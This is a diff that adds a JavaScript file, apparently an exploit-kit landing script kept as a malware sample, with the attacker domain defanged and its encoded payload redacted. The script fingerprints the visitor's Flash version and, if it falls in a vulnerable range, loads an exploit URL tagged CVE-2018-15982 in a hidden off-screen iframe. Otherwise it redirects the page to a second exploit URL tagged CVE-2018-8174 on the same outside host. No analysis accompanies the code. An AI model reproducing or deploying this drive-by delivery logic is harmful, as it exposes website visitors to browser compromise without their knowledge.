@@ -1,0 +1,105 @@
+var p = 'redacted'  // base64-encoded function PluginDetect. Original version can be found here: http://www.pinlady.net/PluginDetect/Flash/
+
+function decode_base64(s) {
+    var e = {},
+        i, k, v = [],
+        r = '',
+        w = String.fromCharCode;
+    var n = [
+        [65, 91],
+        [97, 123],
+        [48, 58],
+        [43, 44],
+        [47, 48]
+    ];
+
+    for (z in n) {
+        for (i = n[z][0]; i < n[z][1]; i++) {
+            v.push(w(i));
+        }
+    }
+    for (i = 0; i < 64; i++) {
+        e[v[i]] = i;
+    }
+
+    for (i = 0; i < s.length; i += 72) {
+        var b = 0,
+            c, x, l = 0,
+            o = s.substring(i, i + 72);
+        for (x = 0; x < o.length; x++) {
+            c = e[o.charAt(x)];
+            b = (b << 6) + c;
+            l += 6;
+            while (l >= 8) {
+                r += w((b >>> (l -= 8)) % 256);
+            }
+        }
+    }
+    return r;
+}
+
+var p2 = decode_base64(p);
+
+var jj = document.createElement("script");
+jj.type = "text/javascript";
+jj.text = p2;
+
+document.getElementsByTagName("BODY")[0].appendChild(jj);
+
+//document.write(decode_base64(p));
+
+f_version = PluginDetect.getVersion('Flash');
+
+function CheckVersionFlash(f_version) {
+    if (f_version != null) {
+        f_version = f_version.split(",");
+    }
+    else return false;
+    if (f_version[0] < 21) return false;
+    if (f_version[0] > 31) return false;
+    if (f_version[0] == 31 && f_version[3] > 153) return false;
+    return true;
+}
+
+function createIframe(url) {
+    try {
+        var kkk = "test";
+        var c = document.createElement('div');
+        c.style.position = 'absolute';
+        c.style.left = '-1000px';
+        c.id = kkk;
+        var d = document.createElement('iframe');
+        d.width = '500';
+        d.height = '100';
+        d.src = url;
+        try {
+            document.body.appendChild(c);
+            document.getElementById(kkk).appendChild(d)
+        } catch (epx) {
+            document.documentElement.appendChild(c);
+            document.getElementById(kkk).appendChild(d)
+        }
+        return true
+    } catch (ex) {
+        return false
+    }
+}
+
+function redir(url) {
+    try {
+        top.window.location.replace(url);
+    } catch (e2) {
+        window.parent.location.replace(url);
+    }
+}
+
+try {
+
+
+    if ((true) && (CheckVersionFlash(f_version))) {
+        createIframe("http://spamfree[.]googleresearcher[.]xyz/?s=032c83223416fdfd970a7a8bb43f7b4afl");  // CVE-2018-15982
+    } else {
+        redir("http://spamfree[.]googleresearcher[.]xyz/?s=5c85c1e3e44ec616e67ecae29f6072favb");  // CVE-2018-8174
+    }
+} catch (ex) {}
+
